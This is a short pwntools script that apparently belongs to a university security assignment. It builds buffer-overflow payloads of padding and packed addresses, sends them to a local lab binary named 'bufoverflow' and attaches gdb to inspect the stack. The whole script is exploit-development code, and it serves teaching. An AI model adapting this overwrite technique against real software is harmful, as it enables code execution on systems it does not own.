from pwn import *

io = process("/home/mehrshad/Documents/F20.Security/assignments/Q2/E2.3/bufoverflow")

payload1 = 'A' * 16
payload1 += 'B' * 16
payload1 += 'C' * 16
payload1 += 'D' * 16
payload1 += 'E' * 16
payload1 += 'F' * 16
payload1 += 'G' * 15
print(payload1)
# io.sendline(payload1)
print(io.recvline(timeout=0.2))
print(io.recvline(timeout=0.2))
payload2 =  p32(0x11111111)
payload2 += p32(0x22222222)
payload2 += p32(0x33333333)
payload2 += p32(0x44444444)
payload2 += p32(0xffffd810)
payload2 += p32(0x00007fff)
payload2 += p32(0x00401241)
io.sendline(payload2)
gdb.attach(io, '''
info registers
x/48wx $rsp
x/8i $rip
''')
print(io.recvline(timeout=2))
print(io.recvline(timeout=2))
print(io.recvline(timeout=2))
print(io.recvline(timeout=2))


